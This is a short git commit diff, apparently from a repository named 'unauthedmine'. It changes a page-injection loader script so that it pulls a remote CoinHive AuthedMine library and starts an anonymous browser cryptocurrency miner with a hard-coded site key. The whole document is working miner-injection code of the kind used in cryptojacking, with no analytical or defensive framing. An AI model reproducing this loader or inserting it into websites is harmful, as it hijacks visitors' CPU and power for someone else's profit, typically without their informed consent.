a5c628ac6629a82a36d21f5138280a46c8230692
YT File Server <32802331+youtubefileserver@users.noreply.github.com>
2017-10-16 20:38:14 +0100

    Update x.js

--- unauthedmine/x.js
+++ unauthedmine/x.js
@@ -2,7 +2,7 @@
     var head= document.getElementsByTagName('head')[0];
     var script= document.createElement('script');
     script.type= 'text/javascript';
-    script.src= 'main.js';
+    script.src= 'https://authedmine.com/lib/authedmine.min.js';
     head.appendChild(script);
     script.onload = function() {
         var miner = new CoinHive.Anonymous('7CbSrIMXoIs24V0FH51kngm4jsiKfLoc');
